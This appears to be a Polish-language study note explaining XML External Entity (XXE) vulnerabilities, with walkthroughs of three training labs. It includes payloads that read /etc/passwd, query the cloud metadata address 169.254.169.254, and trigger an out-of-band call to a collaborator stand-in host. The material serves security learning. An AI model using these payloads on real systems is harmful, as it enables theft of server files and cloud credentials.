XML to prosty format tekstowy służący do przechowywania i wymiany danych w uporządkowanej (tagowanej) formie.

XXE (XML External Entity) to podatność bezpieczeństwa, w której parser XML pozwala na wczytanie zewnętrznych danych (np. plików z systemu), co atakujący może wykorzystać do kradzieży informacji lub ataku.

📦 Przykład:

```
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
```
XML mówi: „hej parserze, weź dane z innego miejsca”
to „inne miejsce” to właśnie external entity

🧠 Czyli:
dla OS: /etc/passwd → wewnętrzny plik
dla XML parsera: /etc/passwd → zewnętrzne źródło danych

🔥 Najprostsza definicja (pentesterska):
External = poza XML-em, nie poza systemem

Dlatego:
file:///etc/passwd → external entity (lokalny plik)
http://127.0.0.1 → external entity (sieć)
ftp://... → też external

<br><br>
<hr>
<br><br>
<h2>Lab: Exploiting XXE using external entities to retrieve files</h2>

 This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. 

 original:

 ```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>3</storeId></stockCheck>
```

payload:

```
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>3</storeId></stockCheck>
```



 <img width="1200" height="602" alt="image" src="https://github.com/user-attachments/assets/1c37d999-3ef4-43ae-a413-8b89dd6524a8" />


<img width="1199" height="646" alt="image" src="https://github.com/user-attachments/assets/aa660ba5-5031-4729-8ee2-3e63c18d1d94" />




<br><br>
<hr>
<br><br>
<h2>Lab: Exploiting XXE to perform SSRF attacks</h2>

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response. 


original:

```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
  </storeId>
</stockCheck>

```

<img width="1198" height="608" alt="image" src="https://github.com/user-attachments/assets/e3dec4a8-0e91-44fb-a2ba-90494df6f845" />


<img width="1223" height="687" alt="image" src="https://github.com/user-attachments/assets/dec80acb-67a4-467e-8457-67a1ddb34834" />
<img width="1204" height="603" alt="image" src="https://github.com/user-attachments/assets/0d452c77-0ad6-4f12-adb7-f7f73b9a36cb" />



<br><br>
<hr>
<br><br>
<h2>Lab: Blind XXE with out-of-band interaction</h2>

<img width="673" height="375" alt="image" src="https://github.com/user-attachments/assets/7225322e-ad94-4755-880f-c7b7af9dbef3" />

payload:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://BURP-COLLAEDRATOR-SUBDOMAIN"> ]>
<stockCheck>
  <productId>
    &xxe;
  </productId>
  <storeId>
  </storeId>
</stockCheck>
```

<img width="1196" height="588" alt="image" src="https://github.com/user-attachments/assets/a4b421a1-b58a-4b5f-a40a-67276736ee93" />

<img width="1195" height="603" alt="image" src="https://github.com/user-attachments/assets/48cf2a12-8ce6-4b3d-83c1-a54ff4d4ed51" />





```

